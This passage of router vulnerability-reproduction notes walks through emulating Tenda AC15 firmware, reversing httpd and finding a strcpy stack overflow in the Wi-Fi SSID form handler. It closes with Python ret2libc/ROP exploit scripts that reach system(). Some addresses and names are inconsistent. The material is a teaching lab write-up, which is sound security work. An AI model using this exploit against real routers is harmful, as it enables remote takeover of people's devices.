mount -t tmpfs none /var/etc/upan -o size=2M
mdev -s
mkdir /var/run
#mount -t jffs2 /dev/mtdblock7 /cfg

echo '/sbin/mdev' > /proc/sys/kernel/hotplug
#echo 'sd[a-z][0-9] 0:0 0660 @/usr/sbin/autoUsb.sh $MDEV' >> /etc/mdev.conf
#echo 'sd[a-z] 0:0 0660 $/usr/sbin/DelUsb.sh $MDEV' >> /etc/mdev.conf
#echo 'lp[0-9] 0:0 0660 */usr/sbin/IppPrint.sh'>> /etc/mdev.conf
#wds rule start
echo 'wds*.* 0:0 0660 */etc/wds.sh $ACTION $INTERFACE' > /etc/mdev.conf
#wsd rule end
echo 'sd[a-z][0-9] 0:0 0660 @/usr/sbin/usb_up.sh $MDEV $DEVPATH' >> /etc/mdev.conf
echo '-sd[a-z] 0:0 0660 $/usr/sbin/usb_down.sh $MDEV $DEVPATH'>> /etc/mdev.conf
echo 'sd[a-z] 0:0 0660 @/usr/sbin/usb_up.sh $MDEV $DEVPATH'>> /etc/mdev.conf
echo '.* 0:0 0660 */usr/sbin/IppPrint.sh $ACTION $INTERFACE'>> /etc/mdev.conf
#echo '115.159.183.96 cloud.tenda.com.cn' >> /etc/hosts
mkdir -p /var/ppp
insmod /lib/modules/fastnat.ko 
insmod /lib/modules/bm.ko
#insmod /lib/modules/ai.ko 
insmod /lib/modules/mac_filter.ko 
#insmod /lib/modules/ip_mac_bind.ko
insmod /lib/modules/privilege_ip.ko
insmod /lib/modules/qos.ko
insmod /lib/modules/url_filter.ko
insmod /lib/modules/loadbalance.ko
echo "0 0 0 0">/proc/sys/kernel/printk
#insmod /lib/modules/app_filter.ko
#insmod /lib/modules/port_filter.ko
#insmod /lib/modules/arp_fence.ko
#insmod /lib/modules/ddos_ip_fence.ko
insmod /lib/modules/jnl.ko
insmod /lib/modules/ufsd.ko
insmod /lib/modules/fastnat_configure.ko
chmod +x /etc/mdev.conf

cfmd &   # Note: the '&' runs the process in the background, so this indicates it's a service/daemon
echo '' > /proc/sys/kernel/hotplug
udevd &  # udevd runs in the background
logserver &   # logserver runs in the background

tendaupload &  # tendaupload runs in the background
if [ -e /etc/nginx/conf/nginx_init.sh ]; then
        sh /etc/nginx/conf/nginx_init.sh
fi

moniter &  # moniter runs in the background
telnetd &  # telnetd runs in the background
```



3、Because we saw the `cfmd` service, search for binaries associated with this service (`cfmd` is a vendor-chosen name).

```apl
grep -lr cfmd  # Search recursively for files that contain 'cfmd' and list filenames
# possible output:
# httpd
# upgrade
# cfmd
# Note: 'grep -lr' is a common and efficient combination when you want to quickly find files that contain a given text without printing the matching lines.
```



4、Since this firmware is for a router, verify whether the `httpd` service references or contains `cfmd`.

```apl
grep -lr httpd  # Search for files containing 'httpd'
# you will find related hits
```

5、Next determine the location of `cfmd`.

```apl
find / -name cfmd 2>/dev/null  # You will find it in the bin directory
```

1. Now you can load `cfmd` into IDA for static reverse engineering.

```apl
1. After loading into IDA you'll find that the usual program entry `main` is missing — the binary is stripped, a common anti-reverse technique.
2. Examine the functions and locate `_start`, which in turn references `sub_A078`, then continue reasoning.
3. Since we know cfmd and httpd are related, search in IDA (Shift+F12) for 'httpd' to find `_start_httpd`, then go into `sub_D528`.
4. In `sub_D528`, choose the function and press 'x' (cross references) to see who calls it; the caller is `sub_DDEC`.
5. Continue the same cross-reference tracing until you find `sub_DEC4`.
6. Continue and you'll find `sub_A078`. From `_start` you can deduce the execution flow:
7. _start --> sub_A078 --> sub_DEC4 --> sub_DEC4-0x1c140 --> sub_DDEC --> sub_D528
```



7、The second method is forward reasoning: walk through the pseudocode starting at `_start` and follow logic step-by-step.

8、First, run the extracted firmware (or run the ARM binaries).

```apl
apt install qemu-user-static # Install qemu user-static because you need to run in user-mode locally
cp $(which qemu-arm-static)  # Copy the qemu-arm-static binary into the environment
```

9、Once installed:

```apl
sudo chroot . ./qemu-arm-static bin/httpd  # Run the binary inside chroot through qemu-arm-static
# You should see output: WeLoveLinux
```

In short, `chroot` makes a process treat a specified directory as its root (`/`). Once the process is in this changed root environment (a "chroot jail"), it cannot access files outside that directory tree.

9.1 Core concept: changing root

When you run `chroot /path/to/new/root command`, the system does two things:

- Isolation: change the process's root directory `/` to `/path/to/new/root` for the process and its children.
- Start the command: execute the specified `command` inside the new root environment.

10、Now load the `httpd` binary into IDA for analysis.

```apl
Shift + F12 (search strings)  Cmd + F  # Search for 'WeLoveLinux' to find function sub_2E420
# IDA static analysis shows why the program can't proceed: there is a loop. You need to patch the branch so execution can continue.
# Set a breakpoint at the MOV instruction (F2).
```

![](/Users/Hacker_learn/Cybersecurity_Note/IoT_Security/Vulnerability_Reproduction_Notes/Tenda_AC_15/img/ac-1.png)



### You can use the keypath plugin here to edit branch instructions

![](/Users/Hacker_learn/Cybersecurity_Note/IoT_Security/Vulnerability_Reproduction_Notes/Tenda_AC_15/img/ac-2.png)

![](/Users/Hacker_learn/Cybersecurity_Note/IoT_Security/Vulnerability_Reproduction_Notes/Tenda_AC_15/img/ac-3.png)

11、Change the pseudo `BGT` to `B` to force the jump and let the program continue.

12、After modifying and saving the binary, upload the modified `httpd` to the VM and run it. If the listening IP looks wrong, return to the IDA pseudocode to analyze why.

```apl
httpd listen ip = 255.255.255.255 port = 80
webs: Listening for HTTP requests at address 68.13.128.64
```

13、By tracing the listen IP you find code that uses `inet_ntoa`.

## 1️⃣ Definition

`inet_ntoa` is a common function in Python and C networking that converts an IPv4 address in network byte order (big-endian) to a dotted-decimal string.

- C prototype:

```c
char *inet_ntoa(struct in_addr in);
```

- Python (socket module):

```python
import socket
socket.inet_ntoa(packed_ip)
```

------

## 2️⃣ Input parameters

- C:
  - `struct in_addr in`: structure holding the IP address, typically a 32-bit integer in network byte order.
- Python:
  - `packed_ip`: a 4-byte `bytes` object representing an IPv4 address, each byte corresponding to one octet.
  - Note: `packed_ip` must be in **network byte order** (big-endian).

------

## 3️⃣ Return value

- Returns a dotted-decimal string, for example:

```
b'\x7f\x00\x00\x01' → '127.0.0.1'
```

------

## 4️⃣ Use cases

- Convert binary IP addresses captured from raw sockets into human-readable form.
- Useful in network protocol development, CTFs, and exploit development when handling binary IPs.

------

## 5️⃣ Python example

```python
import socket
import struct

# Binary IP
packed_ip = b'\xC0\xA8\x01\x01'  # corresponds to 192.168.1.1

# Convert to dotted-decimal
ip_str = socket.inet_ntoa(packed_ip)
print(ip_str)  # Outputs: 192.168.1.1

# Build packed IP from integer
ip_int = 0xC0A80101
packed_ip2 = struct.pack('!I', ip_int)
print(socket.inet_ntoa(packed_ip2))  # Outputs: 192.168.1.1
```

- `struct.pack('!I', ip_int)`:
  - `!` means network byte order (big-endian)
  - `I` means 4-byte unsigned integer

------

## 6️⃣ C example

```c
#include <stdio.h>
#include <arpa/inet.h>

int main() {
    struct in_addr ip;
    ip.s_addr = htonl(0xC0A80101); // convert 192.168.1.1 to network byte order
    printf("IP: %s\n", inet_ntoa(ip)); // Outputs: 192.168.1.1
    return 0;
}
```

- `htonl`: host-to-network long (convert host byte order to network byte order)

------

## 7️⃣ Notes

1. `inet_ntoa` only supports IPv4; use `inet_ntop` for IPv6.
2. In C, `inet_ntoa` returns a pointer to a static buffer; repeated calls will overwrite it — copy if needed.
3. Python's `socket.inet_ntoa` returns a safe Python string.

------

✅ Summary:

- Function: binary IPv4 → dotted-decimal string
- Python usage: `socket.inet_ntoa(packed_ip)`
- Input: 4 bytes in network byte order
- Output: readable string like `"192.168.0.1"`

13、In the pseudocode analysis you can see:

```apl
v8 = inet_ntoa(*(struct in_addr *)&s.sa_data[2]);  # The program uses inet_ntoa() on s.sa_data[2]
*(_DWORD *)&s.sa_data[2] = inet_addr(a1);  # Here 'a1' is used to set that value
# Next we need to find how 'a1' is passed in. Use 'x sub_1B84C' cross-references; there are three callers.
dword_101A7C = sub_1B84C(v8, a1, (int)websAccept, 0);  # v8 is passed
# Continue analyzing this function; above you can see v8 = g_lan_ip;
# Use cross-refs to find g_lan_ip
# Down to sub_2E420+2C0 LDR R2, [R4,R2]; g_lan_ip — entering here shows:
LanIfName = getLanIfName();
if ( getIfIp(LanIfName, v21) < 0 )
{
    GetValue("lan.ip", s);
    strcpy(g_lan_ip, s);
}
```

14、Here we discovered `getIfIp` and `getLanIfName`. Double-clicking shows `getIfIp` is in a library.

```
# We need to inspect getIfIp's behavior
readelf -d httpd  # check dynamic linked libraries used by httpd
cd ../lib/  # enter lib directory
grep -ir "getIfIp" . "getLanIfName"  # find which .so contains these functions
# expected hits: libtpi.so and libcommon.so — load these .so files into IDA to inspect the functions
```

15、In `libcommon.so` we found these functions:

```c
// getIfIp
int __fastcall getIfIp(const char *a1, char *a2)
{
  char *v3; // r0
  char dest[20]; // [sp+Ch] [bp-28h] BYREF
  struct in_addr v8; // [sp+20h] [bp-14h]
  int fd; // [sp+2Ch] [bp-8h]

  fd = socket(2, 2, 0);
  if ( fd < 0 )
    return -1;
  strncpy(dest, a1, 0x10u);
  if ( ioctl(fd, 0x8915u, dest) >= 0 )
  {
    v3 = inet_ntoa(v8);
    strcpy(a2, v3);
    close(fd);
    return 0;
  }
  else
  {
    close(fd);
    return -1;
  }
}
// getLanIfName
int getLanIfName()
{
  return get_eth_name(0);  // find this similarly
}
// get_eth_name
const char *__fastcall get_eth_name(int a1)
{
  const char *v1; // r3

  switch ( a1 )
  {
    case 0:
      v1 = "br0";
      break;
    case 1:
      v1 = "br1";
      break;
    case 6:
      v1 = "vlan1";
      break;
    case 10:
      v1 = "vlan2";
      break;
    case 11:
      v1 = "vlan3";
      break;
    case 12:
      v1 = "vlan4";
      break;
    case 13:
      v1 = "vlan5";
      break;
    case 23:
      v1 = "eth1";
      break;
    case 24:
      v1 = "wl0.1";
      break;
    case 27:
      v1 = "eth2";
      break;
    case 28:
      v1 = "wl1.1";
      break;
    case 51:
      v1 = "br10";
      break;
    case 55:
      v1 = "br20";
      break;
    default:
      v1 = (const char *)&unk_66C8;
      break;
  }
  return v1;
}
```

# Line-by-line explanation (control flow & functionality)

We'll walk through `getIfIp(const char *a1, char *a2)`:

1. `fd = socket(2, 2, 0);`

   - Creates a socket. The constants `2,2,0` correspond to:
     - `AF_INET` == 2 (address family IPv4)
     - `SOCK_DGRAM` == 2 (UDP / datagram socket)
   - Returns a file descriptor `fd`, or `< 0` on failure.

2. `if ( fd < 0 ) return -1;`

   - Return -1 if socket creation failed.

3. `strncpy(dest, a1, 0x10u);`

   - Copies the interface name `a1` into local `dest` (20 bytes), up to 16 (`0x10`) bytes.
   - This pseudocode simplifies usage; in real code you should pass a `struct ifreq` to `ioctl`, not a raw string. The disassembly likely treats `dest` as the start of a `struct ifreq` buffer, or other fields are written later — the pseudocode condensed those operations.

4. `if ( ioctl(fd, 0x8915u, dest) >= 0 )`

   - `0x8915` is typical for `SIOCGIFADDR` (get interface address).
   - `ioctl(fd, SIOCGIFADDR, struct ifreq *ifr)` expects a pointer to `struct ifreq` with `ifr_name` and a `sockaddr` to be filled.
   - Here the pseudocode passes `dest` as that pointer. If `ioctl` returns >= 0 it's successful and the kernel wrote address info into the buffer.

5. `v3 = inet_ntoa(v8);`

   - `inet_ntoa` converts `struct in_addr` (network byte order IPv4) into a string like `"192.168.1.1"`.

   - In pseudocode `v8` isn't explicitly shown being set, but in real C it comes from `ifr.ifr_addr.sin_addr`. For example:

     ```
     struct ifreq ifr;
     strncpy(ifr.ifr_name, a1, IFNAMSIZ);
     ioctl(fd, SIOCGIFADDR, &ifr);
     struct sockaddr_in *sin = (struct sockaddr_in *)&ifr.ifr_addr;
     strcpy(a2, inet_ntoa(sin->sin_addr));
     ```

   - So `v8` maps to `sin->sin_addr`.

6. `strcpy(a2, v3);`

   - Copies the inet_ntoa string into the caller-supplied buffer `a2`.
   - `strcpy` has no bounds checking — if `a2` is too small this causes overflow (stack or heap depending on location).

7. `close(fd); return 0;`

   - Close socket and return 0 (success).

8. `else { close(fd); return -1; }`

   - On ioctl failure, close fd and return -1.

------

`getLanIfName()`:

- Returns `get_eth_name(0)`, i.e., the `case 0` branch of `get_eth_name`, which is `"br0"` — indicating the default LAN interface name is `br0`.

`get_eth_name(int a1)`:

- Returns the interface name string mapped to the integer. The default branch returns `(const char *)&unk_66C8` (some unknown global string pointer).

------

# Data structures needed in real code (key points)

In real C code, `ioctl(fd, SIOCGIFADDR, &ifr)` is used like:

```
struct ifreq ifr;
memset(&ifr, 0, sizeof(ifr));
strncpy(ifr.ifr_name, ifname, IFNAMSIZ-1);
if (ioctl(fd, SIOCGIFADDR, &ifr) == 0) {
    struct sockaddr_in *sin = (struct sockaddr_in *)&ifr.ifr_addr;
    const char *ip = inet_ntoa(sin->sin_addr);
    strcpy(out_buf, ip);
}
```

Note `struct ifreq` layout varies slightly by platform but contains `ifr_name` and `ifr_addr`.

In the pseudocode `dest` likely represents the `struct ifreq ifr` starting address and `v8` maps to `sin->sin_addr`. Disassemblers sometimes split overlay memory into different pseudo-variables like `dest` and `v8`.

------

# Potential security issues & risks (detailed)

1. **`strcpy(a2, v3)` — no bounds check on `a2`: obvious buffer overflow risk**
   - `inet_ntoa` returns at most 16 bytes (`"255.255.255.255"` + NULL). If `a2` has less space, overflow occurs.
   - If `a2` is a small stack buffer, this can lead to stack overflow and possible RCE depending on ASLR/NX/canaries. In embedded firmware `a2` may often be small so risk is high.
2. **`strncpy(dest, a1, 0x10u)` — may lack explicit NUL-termination**
   - `strncpy` does not NUL-terminate if source length >= count. If `a1` >= 16 bytes, `dest` may not be NUL-terminated. Kernel usage of `ifr.ifr_name` expects proper limits; safer usage is `strncpy(..., IFNAMSIZ-1); ifr.ifr_name[IFNAMSIZ-1]=0;`.
3. **`inet_ntoa` is not thread-safe**
   - It returns a pointer to a static buffer — each call overwrites it. Concurrent or repeated calls will race/overwrite. Prefer `inet_ntop` which writes into a caller-supplied buffer.
4. **`ioctl` parameter/memory layout unclear (pseudocode issue)**
   - Pseudocode shows `dest` passed to ioctl; actual code must construct a `struct ifreq`. If not properly initialized, ioctl may fail or return garbage.
5. **No check for `inet_ntoa` return (though typically non-NULL)**
   - Robust code should check return values.
6. **Resource management**
   - The code calls `close(fd)` on success and failure; ensure all error paths close the fd.
7. **`get_eth_name` default returns an unknown pointer**
   - `(const char *)&unk_66C8` may be bad if not a valid C string.
8. **Attack surface**
   - If caller allows remote-supplied `a1` or `a2` points to attacker-controlled memory, this can be remotely triggered for overflow or info leak.
   - If attacker can point `a2` to a file/mmap, writes may overwrite sensitive regions.

------

# Possible exploitation vectors (scenarios)

- **Local privilege escalation / RCE (hard conditions)**:
  - If `a2` points to a small stack buffer in a privileged process (e.g., web server run as root), `strcpy(a2, v3)` could overwrite return addresses or function pointers, enabling code execution. Success depends on memory layout and protections.
- **Information leak**:
  - Uninitialized fields or incorrect `ifr` usage could leak stack/heap memory.
- **Denial of Service**:
  - Malformed `a1` causing ioctl to block or error could lead to resource exhaustion/DoS.

------

# Summary (key takeaways)

- `getIfIp` intent: use `SIOCGIFADDR` to get IPv4 of an interface and copy its dotted-decimal string into `a2`. Returns 0 on success, -1 on failure.
- Risks:
  - `strcpy(a2, ...)` is unsafe — buffer overflow possible.
  - `strncpy` may not NUL-terminate.
  - `inet_ntoa` uses a static buffer and is not thread-safe; prefer `inet_ntop`.
  - `ioctl` third argument should be a `struct ifreq*`; ensure proper construction.
  - `get_eth_name` default returning unknown pointer is suspicious.

------

16、From the code above `get_eth_name` is called with 0, so the IP is obtained from the `br0` interface.

```
cp -a webroot_ro/* ./webroot  # Copy files from webroot_ro into webroot
sudo brctl addbr br0  # Create a bridge interface named br0 in the host kernel
sudo ifconfig br0 192.168.0.1  # Set gateway IP on br0
sudo chroot . ./qemu-arm-static ./bin/httpd  # Emulate starting the service and visit 192.168.0.1 in browser
```

17、Next we'll use `qemu-system-arm` to emulate the router system; first create a startup script:

```
#!/bin/sh
qemu-system-arm -M vexpress-a9 -kernel /home/iot/tools/qemu-images/armhf/vmlinuz-3.2.0-4-vexpress -initrd /home/iot/tools/qemu-images/armhf/initrd.img-3.2.0-4-vexpress -drive if=sd,file=/home/iot/tools/qemu-images/armhf/debian_wheezy_armhf_standard.qcow2 -append "root=/dev/mmcblk0p2 console=ttyAMA0" -net nic -net tap,ifname=tap0,script=no,downscript=no -nographic
```

18、After creating the script, set permissions and configure host networking:

```
sudo tunctl -t tap0
sudo ifconfig tap0 192.168.3.1/24 up  # If you want NAT and firewall, add the following commands
-------------------------------------------------------------------------------
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward > /dev/null # Enable NAT forwarding (assume host external interface is ens33)
sudo iptables -t nat -A POSTROUTING -o ens33 -j MASQUERADE
sudo iptables -A FORWARD -i tap0 -j ACCEPT
sudo iptables -A FORWARD -o tap0 -j ACCEPT
```

19、After network config:

```
chmod 777 start.sh 
./start.sh  # Run the script. A new terminal will appear; wait and log in with root/root
```

20、After logging in, disable address space randomization (ASLR) for debugging:

```
sudo sh -c "echo 0 > /proc/sys/kernel/randomize_va_space"
# 0: disable ASLR completely
# 1: partial randomization
# 2: full randomization (default)
cat /proc/sys/kernel/randomize_va_space  # should print 0
```

21、Configure guest network interfaces:

```
ip link add br0 type dummy  # Create a dummy virtual network interface
ifconfig eth0 192.168.3.2/24 # Assign IP to eth0
ifconfig br0 192.168.3.3/24 # Assign IP to br0
```

22、After configuration, tar `squashfs-root`, serve it via Python HTTP server and fetch on guest; also upload `gdbserver` to the QEMU guest:

```
tar -cvf ss.tar.gz squashfs-root/ # Archive folder
python3 -m http.server 8000 # Start a simple HTTP server on host
wget http://192.168.3.1:8000/ss.tar.gz  # On guest, download the archive
tar -xvf ss.tar.gz   # Extract
wget http://192.168.3.1:8000/gdbserver-7-7-1-armhf-eabi5-v1-sysv # Upload gdbserver
```

​	22.1 If the guest's IP resets to null on boot, try:

```
sudo pkill dhclient  # Stop DHCP client
```

​	22.2 Alternatively, use static `eth0` configuration in guest `/etc/network/interfaces`:

```
auto eth0
iface eth0 inet static
    address 192.168.3.2
    netmask 255.255.255.0
    gateway 192.168.3.1
    dns-nameservers 8.8.8.8 114.114.114.114
```

23、Start `httpd` inside the QEMU guest:

```
chroot . sh  # Start a shell with current directory as new root
cd bin/
./httpd   # Run httpd; then use a browser to open the configured IP
```

24、In the web UI, search for likely overflow points:

```
The web UI has a left menu. Start reviewing pages:
- "Network status" looks not promising.
- "WAN settings": inputs are DNS servers; likely constrained by validation.
- The Wi-Fi settings page contains SSID and password fields — try submitting abnormal input.
After saving and re-opening dev tools, requests are POSTed to a /goform handler.
Search IDA for 'goform' and find function su_2E9EC, which eventually calls sub_179A8 -> assigns to v4 -> handled by sub_42378.
Inside sub_42378 many form fields are processed. Look for 'form_fast_setting_wifi_set' — exactly our target (confirmed in webroot index.js).
Pseudocode shows two `strcpy` calls (dangerous).
Switch to IDA-view-A (Ctrl+K) to inspect stack layout — see screenshot.
```

![](/Users/Hacker_learn/Cybersecurity_Note/IoT_Security/Vulnerability_Reproduction_Notes/Tenda_AC_15/img/ac-7.png)

25、We choose to exploit the first `strcpy`. From the stack layout:

- `s` is closest to LR (return address).
- If we choose `dest`, we might overwrite `s`. To be safe, choose the first `strcpy`.

26、Before building the exploit, find the stack address where the first `strcpy` writes. If overflowing to the return address, you will overwrite the second `strcpy`'s `*src` parameter (which must remain valid). Therefore keep the second `strcpy`'s source pointer intact by overwriting it with a valid address that does not contain `\x00` (since `strcpy` truncates at NUL). Find such a readable string address in libc (loaded early => high base address), so payload won't be truncated by `\x00`. Use dynamic debugging to find libc base.

27、After launching httpd:

```
ps aux | grep httpd  # find httpd pid
./gdbserver :1233 --attach <httpd-pid>  # start gdbserver and attach to httpd
pwndbg ./httpd  # on host, open the binary with pwndbg
target remote <guest_ip>:1233
vmmap  # view memory map to find libc base; example libc base: 0x76dab000
```

![](/Users/Hacker_learn/Cybersecurity_Note/IoT_Security/Vulnerability_Reproduction_Notes/Tenda_AC_15/img/ac-5.png)

28、Next, load `libc.0.so` into IDA and find a string to use as the second `strcpy`'s `src`. For example:

```
Found "home" at offset 0x00064144
Found `system` at offset 0x0005A270
```

29、Build an exploit script on the host:

```python
import requests
from pwn import *

ji_addr = 0x76dab000  # libc base
one_jg_addr = ji_addr + 0x00064144  # address of readable string in libc (for second strcpy src)
system_addr = ji_addr + 0x0005A270  # address of system in libc

payload = b'a'*(0x60) + p32(one_jg_addr) + b'b'*(0x18) + p32(system_addr)
url = "http://192.168.3.3/gofrom/fast_setting_wifi_set"
cookie = {"Cookie":"password=qweqwe"}
data = {"ssid":payload}

response = requests.post(url, cookies=cookie, data=data)
response = requests.post(url, cookies=cookie, data=data)
```

30、With gdb connected, run the script to send packets:

```
b *0x67070, 0x67088, 0x6775c  # breakpoints set around first strcpy
c  # continue
--------------
python3 exp_ac15.py  # send exploit from host
--------------
n  # step through on guest; observe in gdb; see jump to 0x5a270 (formGetSystemStatus+8580) succeed
```

31、After successful jump, start building the ROP chain.

```
// Inspect libc's system function in IDA
int __fastcall system(int a1) // It takes a single argument
{
    ............
}
```

32、We anticipate assembly like:

```
mov r0, sp ; blx <reg>
```

33、Use ROPgadget to search for gadgets:

```
ROPgadget --binary ../../gujian/squashfs-root/1ib/1ibc.so.0 | grep "mov r0,sp:blx"
```

![](/Users/Hacker_learn/Cybersecurity_Note/IoT_Security/Vulnerability_Reproduction_Notes/Tenda_AC_15/img/ac-8.png)

```
ROPgadget --binary ../../gujian/squashfs-root/1ib/1ibc.so.0 --only pop
```

![](/Users/Hacker_learn/Cybersecurity_Note/IoT_Security/Vulnerability_Reproduction_Notes/Tenda_AC_15/img/ac-9.png)

34、From the two steps we identify:

```
mov_addr = 0x00040cb4
pop_addr = 0x00018298
```

35、Now construct the ROP payload:

```
import requests
from pwn import *
target_ip = "192.168.3.3"
target_port = 80

ji_addr = 0x76dab000  # libc base
system_addr = 0x5A270  # system offset
pop_addr = 0x18298
mov_addr = 0x49c64

one_jg_addr = ji_addr + 0x00064144  # string address in libc
two_jp_addr = ji_addr + pop_addr
three_jp_addr = ji_addr + system_addr
end_jp_addr = ji_addr + mov_addr

cmd = 'ps>aaaaaaaaaaaaaaaa.txt'

payload = b'a'*(0x60) + p32(one_jg_addr) + b'b'*(0x18) + p32(two_jp_addr) + p32(three_jp_addr) + p32(end_jp_addr)

url = f"http://192.168.3.3/gofrom/fast_setting_wifi_set"
cookie = {"Cookie":"password=qweqwe"}
data = {"ssid":payload}

response = requests.post(url, cookies=cookie, data=data)
response = requests.post(url, cookies=cookie, data=data)
```

36、ROP chain is constructed. Start `httpd` and `gdbserver`, then attach gdbserver.

```
b *0x67070, 0x67088, 0x6775c  # set breakpoints (host startup script)
c  # run until first breakpoint and inspect
c  # continue to second
c  # continue to third
```

![](/Users/Hacker_learn/Cybersecurity_Note/IoT_Security/Vulnerability_Reproduction_Notes/Tenda_AC_15/img/ac-10.png)

![](/Users/Hacker_learn/Cybersecurity_Note/IoT_Security/Vulnerability_Reproduction_Notes/Tenda_AC_15/img/ac-11.png)

![](/Users/Hacker_learn/Cybersecurity_Note/IoT_Security/Vulnerability_Reproduction_Notes/Tenda_AC_15/img/ac-12.png)

37、Verification

![](/Users/Hacker_learn/Cybersecurity_Note/IoT_Security/Vulnerability_Reproduction_Notes/Tenda_AC_15/img/ac-13.png)
